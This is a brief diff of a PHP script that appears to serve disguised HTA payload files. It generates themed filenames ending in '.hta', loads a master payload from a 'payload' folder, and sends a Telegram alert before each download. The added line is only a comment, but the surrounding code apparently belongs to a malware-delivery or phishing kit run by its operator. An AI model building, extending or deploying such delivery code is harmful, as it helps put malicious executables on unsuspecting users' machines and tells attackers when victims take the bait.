@@ -31,6 +31,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['route']) && $_GET['rout
     $filename = $theme . '_' . $uniqueId . '.hta';
     
     // 2. Define Master File Path (CRITICAL FOR RAILWAY)
+    // Points to your payload/master.hta folder
     $masterPath = __DIR__ . '/payload/master.hta';
     
     // 3. Send Telegram Notification BEFORE Downloading
